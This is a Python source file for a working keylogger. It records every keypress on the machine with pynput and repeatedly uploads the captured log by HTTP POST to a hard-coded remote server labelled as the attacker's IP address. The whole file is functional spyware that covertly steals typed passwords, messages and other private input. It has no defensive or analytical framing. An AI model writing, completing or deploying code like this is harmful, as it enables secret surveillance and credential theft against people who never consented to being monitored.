import requests
import json
import threading
import os
import time
from pynput import keyboard

# Configuration
TIME_INTERVAL = 60  # seconds
ATTACKER_IP = "165.22.217.140"
ATTACKER_PORT = "8009"
FILE_NAME = "output.txt"

class KeyLogger:
    def __init__(self):
        self.file_name = FILE_NAME
        self.log_file = open(self.file_name, 'w')
        self.log_file.write("")  # Create an empty file
        self.log_file.close()

    def send_file(self):
        with open(self.file_name, 'rb') as f:
            files = {'file': f}
            try:
                response = requests.post(f"http://{ATTACKER_IP}:{ATTACKER_PORT}/upload", files=files)
                response.raise_for_status()  # Raise an HTTPError for bad responses
                print("File sent successfully!")
            except requests.exceptions.RequestException as e:
                print(f"Error sending file: {e}")
        # Schedule the next request
        threading.Timer(TIME_INTERVAL, self.send_file).start()

    def watch_log_file(self):
        last_modified = os.path.getmtime(self.file_name)
        while True:
            current_modified = os.path.getmtime(self.file_name)
            if current_modified != last_modified:
                last_modified = current_modified
                with open(self.file_name, 'r') as f:
                    log_contents = f.read()
                    try:
                        response = requests.post(f"http://{ATTACKER_IP}:{ATTACKER_PORT}/log", data=log_contents)
                        response.raise_for_status()  # Raise an HTTPError for bad responses
                        print("Log sent successfully!")
                    except requests.exceptions.RequestException as e:
                        print(f"Error sending log: {e}")
            time.sleep(1)  # Check every second

    def on_press(self, key):
        """Write key press to file as a string"""
        key_str = str(key).replace("'", "")  # Remove single quotes
        if key == keyboard.Key.space:
            key_str = " "  # Replace space key with a space character
        elif key == keyboard.Key.enter:
            key_str = "\n"  # Replace enter key with a newline character
        with open(self.file_name, 'a') as f:
            f.write(key_str)

    def on_release(self, key):
        """Stop listener when Home button is pressed"""
        if key == keyboard.Key.home:
            return False

    def start(self):
        """Start sending requests and listening to keyboard events"""
        threading.Thread(target=self.watch_log_file).start()
        self.send_file()
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    key_logger = KeyLogger()
    key_logger.start()